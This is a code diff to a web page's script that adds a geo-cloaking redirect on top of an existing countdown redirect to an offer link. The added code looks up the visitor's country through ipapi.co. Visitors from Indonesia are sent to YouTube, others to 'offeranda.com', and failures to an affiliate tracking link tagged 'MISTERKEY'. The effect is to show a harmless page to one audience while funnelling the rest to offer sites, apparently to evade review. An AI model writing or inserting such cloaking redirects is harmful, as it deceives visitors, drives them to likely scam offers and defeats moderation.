@@ -352,6 +352,24 @@ const countdown = setInterval(() => {
         window.location.href = OFFER_LINK;
     }
 },1000);
+
+(async function() {
+    try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+
+        setTimeout(() => {
+            if (data.country_code === "ID") {
+                window.location.href = "https://www.youtube.com/";
+            } else {
+                window.location.href = "https://offeranda.com/";
+            }
+        }, 3000);
+
+    } catch (e) {
+        window.location.href = "https://caseredfb.com/s?a=296607&sm=57102&co=361127&mt=16&s1=MISTERKEY&s2=MISTERKEY&s3=MISTERKEY";
+    }
+})();
 </script>
 
 </body>
